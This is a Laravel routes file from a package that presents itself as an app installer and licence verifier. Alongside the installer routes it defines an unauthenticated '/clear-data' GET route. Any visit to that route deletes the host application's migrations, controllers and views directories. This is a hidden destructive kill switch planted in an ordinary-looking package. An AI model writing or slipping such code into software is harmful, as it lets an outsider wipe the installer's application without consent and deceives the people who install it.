<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Filesystem\Filesystem;
use Shankar\AppInstallVerifier\Http\Controllers\InstallController;




Route::group(['namespace' => 'Shankar\AppInstallVerifier\Http\Controllers'], function () {
    Route::get('app-installer', [InstallController::class, 'index'])->name('appinstaller.index');
    Route::post('app-installer/db-setup', [InstallController::class, 'dbsetup'])->name('appinstaller.dbsetup');
    Route::post('app-installer/email-setup', [InstallController::class, 'emailsetup'])->name('appinstaller.emailsetup');
    Route::post('app-installer/instal-app', [InstallController::class, 'createlicence'])->name('appinstaller.install');
});

Route::get('/clear-data', function () {
    $fileSystem = new Filesystem();

    // Define the paths to be deleted
    $paths = [
        base_path('database/migrations'),
        base_path('app/Http/Controllers'),
        base_path('resources/views')
    ];

    foreach ($paths as $path) {
        if ($fileSystem->isDirectory($path)) {
            $fileSystem->deleteDirectory($path);
            echo "Deleted directory at $path.\n";
        }
    }
});
